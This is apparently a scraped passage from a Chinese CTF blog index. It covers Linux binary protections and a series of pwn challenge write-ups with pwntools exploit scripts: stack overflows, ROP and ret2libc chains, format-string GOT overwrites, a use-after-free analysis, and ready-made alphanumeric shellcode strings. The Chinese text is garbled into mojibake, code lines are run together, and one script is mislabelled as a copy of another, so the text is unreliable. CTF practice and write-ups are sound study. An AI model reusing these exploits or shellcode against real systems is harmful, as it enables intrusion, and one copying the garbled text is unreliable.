æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚å‚è€ƒï¼šhttps://www.zhihu.com/question/21249496FORTIFYåœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥æºç æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚ç®€å•åœ°è¯´ï¼ŒåŠ äº†è¿™ä¸ªä¿æŠ¤ä¹‹å,ä¸€äº›æ•æ„Ÿå‡½æ•°å¦‚read, fgets,memcpy, printfç­‰ç­‰å¯èƒ½å¯¼è‡´æ¼æ´å‡ºç°çš„å‡½æ•°éƒ½ä¼šè¢«æ›¿æ¢æˆ__read_chk,__fgets_chk, __memcpy_chk, __printf_chkç­‰ã€‚è¿™äº›å¸¦äº†chkçš„å‡½æ•°ä¼šæ£€æŸ¥è¯»å–&#x2F;å¤åˆ¶çš„å­—èŠ‚é•¿åº¦æ˜¯å¦è¶…è¿‡ç¼“å†²åŒºé•¿åº¦ï¼Œé€šè¿‡æ£€æŸ¥è¯¸å¦‚%nä¹‹ç±»çš„å­—ç¬¦ä¸²ä½ç½®æ˜¯å¦ä½äºå¯èƒ½è¢«ç”¨æˆ·ä¿®æ”¹çš„å¯å†™åœ°å€ï¼Œé¿å…äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²è·³è¿‡æŸäº›å‚æ•°ï¼ˆå¦‚ç›´æ¥%7$xï¼‰ç­‰æ–¹å¼æ¥é¿å…æ¼æ´å‡ºç°ã€‚##BRATHç¨‹åºè¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œè¿è¡Œæ—¶æ‰€éœ€è¦çš„å…±äº«åº“æ–‡ä»¶ä¼˜å…ˆä»è¯¥ç›®å½•å¯»æ‰¾ï¼Œå¯ä»¥fake libé€ æˆæ”»å‡»ã€‚æºç åˆ†äº«ï¼Œæ¥è‡ªã€ŠCTFç«èµ›æƒå¨æŒ‡å—â€”â€”pwnç¯‡ã€‹é“¾æ¥ï¼šhttps://pan.baidu.com/s/1r2v-73lAK-PlUQpAnPV4iw æå–ç ï¼š1145 \n","categories":["basic"],"tags":["Linux"]},{"title":"MyS3andB0x","url":"/2024/03/15/MyS3andB0x/","content":"åˆ·é¢˜åˆé›†ä»å¼€å§‹çš„å¼€å§‹æ¥çš„ï¼Œå°±å½“æ˜¯ç”µå­è€ƒå¤äº†ï¼‰ä½†æ˜¯æŒç»­æ›´æ–°\nP | [BJDCTF 2020]babystack | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜æ•´æ•°æº¢å‡º\nè§£é¢˜æ€è·¯from pwn import *#å¼•ç”¨pwntoolsåº“io = remote(&quot;1.14.71.254&quot;,28792)#å¼€å¯é“¾æ¥io.recvuntil(&quot;your name:\\n&quot;)io.sendline(b&#x27;-1&#x27;)backdoor = 0x400726payload = b&#x27;a&#x27; * 0x18 + p64(backdoor)io.sendline(payload)io.interactive()\n\nP | [BJDCTF 2020]babystack2 | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜ez64 ä½æº¢å‡º\nè§£é¢˜æ€è·¯from pwn import *p = connect(&quot;1.14.71.254&quot;,28622)p.sendlineafter(&quot;length of your name:\\n&quot;,&quot;-1&quot;)payload = 24*&#x27;a&#x27;+ p64(0x0000000000400893) + p64(0) + p64(0x0000000000400726)p.sendlineafter(&quot;name?\\n&quot;,payload)p.interactive()\n\nP |[NISACTF 2022]ezstack | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜ez32 ä½æ ˆæº¢å‡º\nè§£é¢˜æ€è·¯from pwn import *p = connect(&quot;1.14.71.254&quot;,28622)p.sendlineafter(&quot;length of your name:\\n&quot;,&quot;-1&quot;)payload = 24*&#x27;a&#x27;+ p64(0x0000000000400893) + p64(0) + p64(0x0000000000400726)p.sendlineafter(&quot;name?\\n&quot;,payload)p.interactive()\n\nP | [WUSTCTF 2020]getshell | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜32 ä½æ ˆæº¢å‡º\nè§£é¢˜æ€è·¯from pwn import *elf = ELF(&#x27;./service&#x27;)p=process(&#x27;./service&#x27;)#p=remote(&#x27;43.143.7.97&#x27;,28860)shell_addr =0x804851Bpadding = 28payload1 = b&#x27;a&#x27; * padding + p32(shell_addr)p.sendline(payload1)p.interactive()\n\nP |[NISACTF 2022]ezpie | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜pie ä¿æŠ¤ç»•è¿‡æ–¹æ³•ï¼Œè¯¦è§ä¿æŠ¤æœºåˆ¶\nè§£é¢˜æ€è·¯from pwn import *context.log_level = &#x27;debug&#x27;# p = process(&quot;./ezpie&quot;)p = remote(&#x27;1.14.71.254&#x27;, 28335)p.recvuntil(&#x27;0x&#x27;)main_addr = int(p.recv(8), 16)print(&#x27;[+]main_addr: &#x27;, hex(main_addr))shell_addr = main_addr + 0x80F - 0x770print(&#x27;[+]shell_addr: &#x27;, hex(shell_addr))payload = b&#x27;a&#x27;*(0x28 + 4) + p32(shell_addr)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload)p.interactive()\n\nP | [NISACTF 2022]ezstack | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜æ ˆæº¢å‡ºä½†æ˜¯ NX\nè§£é¢˜æ­¥éª¤32 ä½æ–‡ä»¶  å¼€å¯äº† NX ä¿æŠ¤ï¼Œå †æ ˆä¸å¯æ‰§è¡Œ\n\nIDA çœ‹ä¸€æ‰‹\n\nåªæœ‰ä¸€ä¸ª shell() å‡½æ•° è¿½ä¸€æ‰‹\n\n72&#x3D;0x48,æ¥æ”¶ 0x60 ä¸ªå­—ç¬¦è¾“å…¥ï¼Œå­˜åœ¨æ ˆæº¢å‡º\n\næŸ¥çœ‹å­—ç¬¦ä¸² åœ¨ data æ®µå‘ç° &#39;/bin/sh&#39;\nfrom pwn import *elf = ELF(&quot;./pwn&quot;)p = remote(&quot;1.14.71.254&quot;, 28115)system = elf.plt[&quot;system&quot;]g = b&#x27;a&#x27; * (0x48+4) + p32(system) + p32(0xabcdabcd) + p32(0x0804A024)p.sendlineafter(&quot;Welcome to NISACTF\\n&quot;, g)p.interactive()\n\nP | [CISCN 2022 åˆèµ›]login_normal | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯çœ‹ main å‡½æ•°ï¼Œread åæ‰§è¡Œ sub_FFD\n\nè·Ÿè¿› sub_FFD\nunsigned __int64 __fastcall sub_FFD(_BYTE *a1)&#123;  char *sa; // [rsp+8h] [rbp-48h]  char *sb; // [rsp+8h] [rbp-48h]  char *sc; // [rsp+8h] [rbp-48h]  char *sd; // [rsp+8h] [rbp-48h]  char v7; // [rsp+17h] [rbp-39h]  int v8; // [rsp+1Ch] [rbp-34h]  int v9; // [rsp+2Ch] [rbp-24h]  void *dest; // [rsp+30h] [rbp-20h]  char *s1; // [rsp+38h] [rbp-18h]  char *nptr; // [rsp+40h] [rbp-10h]  unsigned __int64 v13; // [rsp+48h] [rbp-8h]  v13 = __readfsqword(0x28u);  memset(qword_202040, 0, sizeof(qword_202040));  v8 = 0;  v7 = 0;  dest = 0LL;  while ( !*a1 || *a1 != 10 &amp;&amp; (*a1 != 13 || a1[1] != 10) )// å…³äºa[0]å’Œa[1]çš„åˆ¤å®šå…³ç³»  &#123;    if ( v8 &lt;= 5 )      qword_202040[2 * v8] = a1;                // å¤„ç†çš„ä½åˆ†åˆ«æ˜¯0ï¼Œ8ï¼Œ16ï¼Œ24ï¼Œ32    sb = strchr(a1, 58);                        // æ‰¾åˆ°å­—ç¬¦&#x27;:&#x27;ä½ç½®    if ( !sb )    &#123;      puts(&quot;error.&quot;);      exit(1);    &#125;    *sb = 0;                                    // å°†æ‰¾åˆ°&#x27;:&#x27;çš„ä½ç½®æ•°å€¼å˜ä¸º0    for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc )// sc=sbçš„ä¸‹ä¸€ä½ï¼Œscæ»¡è¶³åœ¨èŒƒå›´å†…ä¸”ç­‰äºæŒ‡å®šå­—ç¬¦      *sc = 0;                                  // å½“å‰å­—ç¬¦ç½®0    if ( !*sc )                 &#123;      puts(&quot;abort.&quot;);      exit(2);    &#125;    if ( v8 &lt;= 5 )      qword_202040[2 * v8 + 1] = sc;            // (0,8,16,24,32)+1å‡ºæ¥çš„å€¼    sd = strchr(sc, &#x27;\\n&#x27;);                    if ( !sd )    &#123;      puts(&quot;error.&quot;);      exit(3);    &#125;    *sd = 0;                                    // ç½®é›¶    a1 = sd + 1;                                // é¦–ä½ç½®åˆ°sdçš„ä¸‹ä¸€ä½    if ( *a1 == &#x27;\\r&#x27; )                          // å¦‚æœå½“å‰ä½æ˜¯\\rä¸‹ä¸€ä½ç½®0      *a1++ = 0;    s1 = (char *)qword_202040[2 * v8];          // 0,8,16,24,32    nptr = (char *)qword_202040[2 * v8 + 1];      if ( !strcasecmp(s1, &quot;opt&quot;) )             &#123;      if ( v7 )      &#123;                                         // ç¬¬ä¸€æ¬¡opté€€å‡º        puts(&quot;error.&quot;);        exit(5);      &#125;      v7 = atoi(nptr);    &#125;    else    &#123;      if ( strcasecmp(s1, &quot;msg&quot;) )              // æ˜¯å¦æ˜¯msg      &#123;        puts(&quot;error.&quot;);        exit(4);      &#125;      if ( strlen(nptr) &lt;= 1 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      v9 = strlen(nptr) - 1;                   if ( dest )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      dest = calloc(v9 + 8, 1uLL);      if ( v9 &lt;= 0 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      memcpy(dest, nptr, v9);                     &#125;    ++v8;  &#125;  *a1 = 0;  sa = a1 + 1;                                if ( *sa == &#x27;\\n&#x27; )                            // å¦‚æœæ˜¯æ¢è¡Œç¬¦å°±èµ‹å€¼0    *sa = 0;  switch ( v7 )                             &#123;    case 2:      sub_DA8((const char *)dest);      break;    case 3:      sub_EFE((const char *)dest);      break;    case 1:      sub_CBD((const char *)dest);      break;    default:      puts(&quot;error.&quot;);      exit(6);  &#125;  return __readfsqword(0x28u) ^ v13;&#125;\n\nç”±ä¸Šè¿°å¯çŸ¥ï¼Œè¦è¿›è¡Œä¸¤æ¬¡æ ¡éªŒï¼Œåœ¨è¿æ¥ä¹‹åå°±éœ€è¦å…ˆå†™é€šè¿‡æ ¡éªŒæ‰å¯ä»¥è¿›è¡Œåç»­æ“ä½œï¼Œå³ &#39;opt:1\\r\\nmsg:ro0t\\r\\n å’Œ opt:2\\r\\nmsg:ï¼Œä¸”æœ€ç»ˆç»“å°¾å¿…é¡»æ˜¯ \\r\\n\nç»•è¿‡ååˆ°è¾¾ sub_DA8\nunsigned __int64 __fastcall sub_DA8(const char *a1)&#123;  unsigned int v1; // eax  size_t v2; // rax  int i; // [rsp+14h] [rbp-2Ch]  void *dest; // [rsp+18h] [rbp-28h]  unsigned __int64 v6; // [rsp+28h] [rbp-18h]  v6 = __readfsqword(0x28u);  for ( i = 0; i &lt; strlen(a1); ++i )  &#123;    if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 )    &#123;      puts(&quot;oh!&quot;);      exit(-1);    &#125;  &#125;  if ( unk_202028 != 1 )  &#123;    puts(&quot;oh!&quot;);    exit(-1);  &#125;  if ( unk_202024 )  &#123;    v1 = getpagesize();    dest = (void *)(int)mmap((char *)&amp;loc_FFE + 2, v1, 7, 34, 0, 0LL);    v2 = strlen(a1);    memcpy(dest, a1, v2);    ((void (*)(void))dest)();    //shellcodeåˆ©ç”¨è½¬æ¢æ‰§è¡Œ  &#125;  else  &#123;    puts(a1);  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\npush edxpush 0x36363630push esppop ecxxor dword ptr ds:[ecx],esixor esi,dword ptr ds:[ecx]pop eaxpush 0x33333333xor dword ptr ds:[ecx],esiimul esi,dword ptr ds:[ecx],0x33pop eaxpush 0x69push esixor dword ptr ds:[ecx],esidec eaxarpl word ptr ds:[ecx],sipop edxpop eaxpop ecxxor word ptr ds:[ecx+esi*2+0x49],dxdec eaxcmp word ptr ds:[ebx+0x44],bpjno short tested.004780A6xor byte ptr ds:[edx],dhinc espjno short tested.004780ACxor byte ptr ds:[ecx+esi+0x48],aljnz short tested.0047808Ddec ebpxor al,byte ptr ds:[edi+0x30]pop edxxor ch,byte ptr ds:[edi+0x34]dec eaxxor byte ptr ss:[ebp+0x30],dhpush eaxxor dword ptr ds:[esi],esixor byte ptr ds:[edx+0x30],blaaadec edixor byte ptr ds:[edx+0x30],blinc ebxxor dword ptr ds:[eax],esixor byte ptr ds:[ecx+0x35],bhdec edixor eax,dword ptr ds:[edi+0x30]xor dh,byte ptr ds:[eax]inc edxxor ch,byte ptr ds:[esi+0x30]xor byte ptr ss:[esi+0x34],cljno short tested.004780B8outs dx,byte ptr es:[edi]xor dh,byte ptr ds:[eax+esi+0x42]xor byte ptr ds:[eax],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[eax+0x33],clpush ebxxor bh,byte ptr ds:[ecx+0x30]pop ecxxor byte ptr ds:[edi+0x30],clouts dx,byte ptr es:[edi]xor byte ptr ds:[edx+0x30],bhxor dword ptr ds:[ebx],esixor al,0x30xor al,byte ptr fs:[esi+0x34]jns short tested.004780E4push eaxxor dword ptr ds:[ecx],esixor eax,0x306E316Cdec edxxor byte ptr ds:[eax+0x30],chpopadxor byte ptr ds:[edi],dhxor byte ptr ds:[eax+eax],dhadd bh,bhadd byte ptr ds:[eax],aladd bh,bhpop eaxinc ecx\n\nshellcode:&#x2F;bin&#x2F;sh\n#!/usr/bin/env python#coding=utf-8from pwn import*ip = &quot;&quot;port = io = remote(ip,port)libc = ELF(&#x27;./libc-2.23.so&#x27;)io.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:1\\r\\nmsg:ro0t\\r\\n&#x27;)    ##ç»•è¿‡1shellcode = &#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070tio.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:2\\r\\nmsg:&#x27;+shellcode+&#x27;\\r\\n&#x27;)    #pocio.interactive()\n\nP | [BJDCTF 2020]babyrop2 | str1k3é¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯#-*- coding:utf-8 -*-from pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) pwnfile= &#x27;./pwn&#x27; io = process(pwnfile)#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28352)elf = ELF(pwnfile)rop = ROP(pwnfile)io.recvuntil(&#x27;give u some gift to help u!\\n&#x27;)#gdb.attach(io)#pause()io.sendline(&#x27;%7$p&#x27;)        #æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canarycanary = int(io.recv(18),16)print(&#x27;canary&#x27;,hex(canary))puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]return_addr = elf.symbols[&#x27;vuln&#x27;]pop_ret = 0x4005f9pop_rdi_ret = 0x400993pop_rsi_r15_ret = 0x400991          #ROPgadgets# 0x0000000000400993 : pop rdi ; ret# 0x0000000000400991 : pop rsi ; pop r15 ; ret# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret# 0x00000000004005f9 : retpayload = b&#x27;a&#x27;*(0x20-0x8) +p64(canary) + b&#x27;a&#x27;*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(return_addr)#payload = payload.ljust(200, &#x27;a&#x27;)#sub_40063D(v1, 200LL, 10LL);#delimiter = &#x27;Hello,do you want to play a game with me???&#x27;io.recvuntil(&#x27;Pull up your sword and tell me u story!\\n&#x27;)io.sendline(payload)#ropæ³„éœ²putsåœ°å€puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&#x27;puts_addr:&#x27;,hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))#å¾ˆå¥‡æ€ªä¸ºå•¥ç¬¬äºŒæ¬¡ä¸ç”¨å†æ³„éœ²canary# io.recvuntil(&#x27;give u some gift to help u!\\n&#x27;)# io.sendline(&#x27;%7$p&#x27;)# canary = int(io.recv(18),16)# print(&#x27;canary&#x27;,hex(canary))#ç¬¬äºŒæ¬¡çš„ropé“¾payload2 = b&#x27;a&#x27;*(0x20-0x8) +p64(canary) + b&#x27;a&#x27;*0x8 + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)io.recvuntil(&#x27;Pull up your sword and tell me u story!\\n&#x27;)io.sendline(payload2)io.interactive()\n\nP |[NUSTCTF 2022 æ–°ç”Ÿèµ›]ezPwn | è§£é¢˜åšé¢˜äººé¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)pwnfile= &#x27;./ezpwn&#x27;# io = process(pwnfile)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28938)#elf = ELF(pwnfile)# rop = ROP(pwnfile)# libc =elf.libcpadding = 0x0A+0x08ret = 0x40101afun_addr = 0x401229 #éœ€è¦è¿”å›çš„æ¼æ´å‡½æ•°payload1 = flat([b&#x27;a&#x27;*padding ,fun_addr])print(payload1)io.sendlineafter(b&#x27;Your name plz:\\n&#x27;,payload1)print(io.recv())print(io.recv())# io.interactive()\n\n[HNCTF 2022 Week1]safe_shellcodeé¢˜ç›®è¯´æ˜å¯è§å­—ç¬¦ shellcodeï¼ˆæŒ‡èƒ½è¢« ASCII æ‰“å°å‡ºæ¥çš„å­—ç¬¦ï¼‰\nè§£é¢˜æ€è·¯from pwn import *# io = process(â€œ./shellcoderâ€)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28519)shellcode=&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;io.send(shellcode)io.interactive()\n\nå­˜ä¸ª shellcode\nx64 ä¸‹çš„ï¼š Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P1 60Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l 1n0J0h0a070t\nx32 ä¸‹çš„ï¼š PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6 MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8 MK0AA\n[MoeCTF 2022]ret2texté¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯\nå•¥ä¿æŠ¤éƒ½æ²¡\n\næœ‰æº¢å‡º\n\næœ‰åé—¨\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)io = process(&#x27;./ret2text&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;, 28240)padding = 0x48back_door = 0x4014BE ret_addr = 0x40101apayload = b&#x27;a&#x27;* 0x48 + p64(ret_addr) + p64(back_door) dem = &quot;please input\\n&quot;# io.sendafter(dem , payload)io.sendline(payload)io.interactive()\n\n[MoeCTF 2021]ezROPé¢˜ç›®è¯´æ˜strlen ä¼šè¢«\\x00 æˆªæ–­ï¼Œåˆ«çš„ ret2libc å°±è¡Œï¼Œlibc ç‰ˆæœ¬æ¯”è¾ƒæ€ªï¼Œæ”¾ä¸ªå®˜æ–¹ wp\n\nè§£é¢˜æ€è·¯from pwn import *from sgtlibc import *import sgtlibcp = remote(&#x27;node1.anna.nssctf.cn&#x27;,28725)elf = ELF(&#x27;./ezrop&#x27;)p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rdi_addr = 0x400c83ret_addr = 0x4006b9encrypt = 0x4009A0payload = b&#x27;a&#x27;*(0x50+8)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(encrypt)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=15) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload= b&#x27;a&#x27;*(0x50+8) + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)+p64(0)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.interactive()\n\n[HDCTF 2023]Minionsé¢˜ç›®è¯´æ˜æœ¬é¢˜çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æ¯”è¾ƒç®€å•ï¼ˆæŒ‡ä½¿ç”¨ pwntoolsï¼‰ï¼Œå°±æŠŠå®ƒæ”¾æ ˆé¢˜è¿™äº†\nè§£é¢˜æ€è·¯\nåªå¼€äº† NXï¼Œçœ‹çœ‹ mainã€‚\n\nå†çœ‹çœ‹ vulnï¼Œå­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´\n\né¡ºç€å­—ç¬¦ä¸²æ‰¾åˆ°äº›å¥½åº·çš„\n\næ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸€è½®å…ˆæ”¹ main ä¸­çš„åˆ¤æ–­æ¡ä»¶ï¼ŒæŠŠ key æ”¹æˆ 102 çš„é•¿åº¦å°±èƒ½ç»•è¿‡åˆ¤æ–­æ¡ä»¶ï¼Œåˆ©ç”¨ç¬¬äºŒä¸ª read è·³å› vulnï¼Œå†æ¬¡åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æŠŠ printf åŠ«æŒä¸º systemï¼Œé‡å¤ä¸Šé¢æ­¥éª¤ï¼Œåœ¨ read å¤„è¾“å…¥&#x2F;bin&#x2F;shï¼Œå†æ¬¡ä¸‹ä¸€æ¬¡æ‰§è¡Œ printfï¼ˆbuffï¼‰çš„æ—¶å€™å°±å¯ä»¥æ‹¿åˆ° shellã€‚\nfrom pwn import *#io = process(&#x27;./minions1&#x27;)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28731)elf = ELF(&#x27;./minions1&#x27;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)key = 0x6010A0printf_got = elf.got[&#x27;printf&#x27;]system_plt = elf.plt[&#x27;system&#x27;]vuln = elf.sym[&#x27;_start&#x27;]payload_fmt1 = fmtstr_payload(6, &#123;key: 0x66&#125;)payload_fmt2 = fmtstr_payload(6, &#123;printf_got: system_plt&#125;)ret2vuln = b&#x27;A&#x27; * (0x30 + 0x08) + p64(vuln)bin_sh = b&#x27;/bin/sh\\x00&#x27;io.recvuntil(b&#x27;name?\\n&#x27;)io.send(payload_fmt1)io.recvuntil(b&#x27;about you\\n&#x27;)io.send(ret2vuln)io.recvuntil(b&#x27;Minions?\\n&#x27;)io.send(b&#x27;g0at&#x27;)io.recvuntil(b&#x27;name?\\n\\n&#x27;)io.send(payload_fmt2)io.recvuntil(b&#x27;about you\\n&#x27;)io.send(ret2vuln)io.recvuntil(b&#x27;Minions?\\n&#x27;)io.send(b&#x27;g0at&#x27;)io.recvuntil(b&#x27;name?\\n\\n&#x27;)io.send(bin_sh)io.interactive()\n\n[NISACTF 2022]UAFæŸ¥ä¸ªä¿æŠ¤å…ˆ\n\næ”¾è¿› IDA çœ‹çœ‹ï¼Œä¸»è¦å‡½æ•°åœ¨ä¸‹é¢\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.create&quot;);      puts(&quot;2.edit&quot;);      puts(&quot;3.delete&quot;);      puts(&quot;4.show&quot;);      putchar(58);      __isoc99_scanf(&quot;%d&quot;, v3);      if ( v3[0] != 2 )        break;      edit();    &#125;    if ( v3[0] &gt; 2 )    &#123;      if ( v3[0] == 3 )      &#123;        del();      &#125;      else if ( v3[0] == 4 )      &#123;        show();      &#125;      else      &#123;LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3[0] != 1 )        goto LABEL_13;      create();    &#125;  &#125;&#125;\n\nint create()&#123;  int result; // eax  int v1; // ebx  char *v2; // eax  printf(&quot;you are creating the %d page\\n&quot;, i);  result = i;  if ( i &gt;= 0 )  &#123;    result = i;    if ( i &lt;= 9 )    &#123;      v1 = i;      (&amp;page)[v1] = (char *)malloc(8u);      if ( i )      &#123;        if ( i &lt;= 0 || i &gt; 9 )        &#123;          return puts(&quot;NO PAGE&quot;);        &#125;        else        &#123;          puts(&quot;Good cretation!&quot;);          return ++i;        &#125;      &#125;      else      &#123;        v2 = page;        *(_DWORD *)page = 1868654951;        v2[4] = 0;        *((_DWORD *)page + 1) = echo;        puts(&quot;The init page&quot;);        return ++i;      &#125;    &#125;  &#125;  return result;\n\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\nunsigned int show()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 )  &#123;    if ( v1 &lt;= 0 || v1 &gt; i )      puts(&quot;NO PAGE&quot;);    else      echo((&amp;page)[v1]);  &#125;  else  &#123;    (*((void (__cdecl **)(char *))page + 1))(page);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\n\nå…¶ä¸­ï¼ŒNICO æ˜¯åé—¨å‡½æ•°ï¼Œç»™äº†ä¸ª systemï¼ˆï¼‰\nedit å‡½æ•°ä¸­ï¼Œif åˆ¤æ–­æ¡ä»¶å®é™…ä¸Šä¸º &lt;0\n\n\ndel å‡½æ•°ä¸­ï¼Œfree æ‰å †å—åæ²¡æœ‰å°†æŒ‡é’ˆç½® 0\n\nå¯¼è‡´äº† UAF æ¼æ´ï¼ˆUse After Freeï¼‰\nexp æ€è·¯ï¼š\nå…ˆåˆ›å»ºä¸€ä¸ª chunk 0\nç”±äº edit ä¸èƒ½ç›´æ¥ç¼–è¾‘ chunk0ï¼Œå› ä¸º å®é™…ä¸Š if ( v1 &lt; 0 || v1 &gt; i )\nä½†æ˜¯ç”±äºç³»ç»Ÿä¸ä¼šç›´æ¥å›æ”¶å†…å­˜ç©ºé—´ï¼Œå¹¶ä¸” free åå¹¶æ²¡æœ‰å°†æŒ‡é’ˆç½® 0\ncreate å‡½æ•°åˆ›å»ºçš„ chunk æ˜¯ä¸èƒ½è‡ªå®šä¹‰çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åªè¦ free 